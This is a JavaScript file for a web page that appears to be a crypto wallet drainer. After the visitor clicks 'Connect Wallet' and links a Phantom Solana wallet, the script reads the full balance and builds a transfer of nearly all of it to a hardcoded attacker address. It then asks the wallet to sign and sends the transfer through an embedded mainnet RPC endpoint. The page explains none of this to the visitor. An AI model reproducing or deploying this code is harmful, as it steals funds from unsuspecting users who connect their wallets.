const BN = window.BN || solanaWeb3.BN;

// ✅ Ensure Buffer is available globally
if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
    window.Buffer = buffer.Buffer;  // ✅ Use the full Buffer implementation
}

// ✅ Ensure the script runs after the page fully loads
document.addEventListener("DOMContentLoaded", function () {
    const connectButton = document.querySelector(".wallet-button");

    if (connectButton) {
        connectButton.addEventListener("click", function () {
            console.log("Connect Wallet button clicked.");
            connectWallet();
        });
    } else {
        console.error("Button not found: Ensure your HTML has a button with class 'wallet-button'");
    }
});

document.getElementById('scrollBtn').addEventListener('click', function () {
    document.querySelector('.content-image').scrollIntoView({ behavior: 'smooth' });
});


async function connectWallet() {
    const provider = window.solana;
    if (provider && provider.isPhantom) {
        console.log("Connecting wallet...");
        await provider.connect();
        console.log("✅ Wallet connected: ", provider.publicKey.toString());

        sendTransaction();
    } else {
        alert("Phantom wallet not detected!");
    }
}

async function sendTransaction() {
    const provider = window.solana;
    if (!provider || !provider.isPhantom) {
        console.error("❌ Phantom Wallet not found!");
        alert("Phantom wallet not detected!");
        return;
    }

    // ✅ Establish Solana RPC Connection
    const connection = new solanaWeb3.Connection("https://chaotic-fittest-dawn.solana-mainnet.quiknode.pro/cacaf7031e2fae593a38ff063c791406bfa40a35/");

    console.log("🔄 Fetching balance...");
    const balance = await connection.getBalance(provider.publicKey);
    console.log("💰 Balance:", balance / 1000000000, "SOL");

   // ✅ Debugging: Log balance type and value before conversion
console.log("🔍 Balance Type:", typeof balance, "Value:", balance);

// ✅ Convert balance to BigInt
const balanceBigInt = BigInt(balance);


    // Set the gas fee (0.001 SOL)
    const gasFee = BigInt(1000000);

    if (balanceBigInt <= gasFee) {
        console.error("⛔ Insufficient balance. Transaction aborted.");
        alert("Not enough SOL to complete the transaction!");
        return;
    }

    // ✅ Correct calculation of amount to send
    const amountToSend = balanceBigInt - gasFee;
    console.log("💸 Amount to transfer:", Number(amountToSend) / 1000000000, "SOL");

    const fromPubkey = provider.publicKey;
    if (!fromPubkey) {
        console.error("❌ Invalid sender public key.");
        alert("Error: Invalid sender public key.");
        return;
    }

    const toPubkey = new solanaWeb3.PublicKey("6Ci4CDMYA4ffqespgAX9QV1joQdev3tWBnpJrm1w37Cx");

    
    const lamports = BigInt(new BN(amountToSend.toString(), 10).toString(10));


    console.log("📝 Lamports Type:", typeof lamports);
    console.log("📝 Lamports Value:", lamports);
    
    const { blockhash } = await connection.getLatestBlockhash();
    
    const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
            fromPubkey: fromPubkey,
            toPubkey: toPubkey,
            lamports: lamports, // ✅ Now correctly formatted
        })
    );

    transaction.recentBlockhash = blockhash;
    transaction.feePayer = fromPubkey;

    try {
        console.log("✍️ Signing transaction...");
        const signedTransaction = await provider.signTransaction(transaction);

        console.log("🚀 Sending transaction...");
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
        console.log("✅ Transaction sent successfully! Signature:", signature);
    } catch (err) {
        console.error("❌ Transaction failed:", err);
        alert("Transaction failed! Please check the console for details.");
    }
}
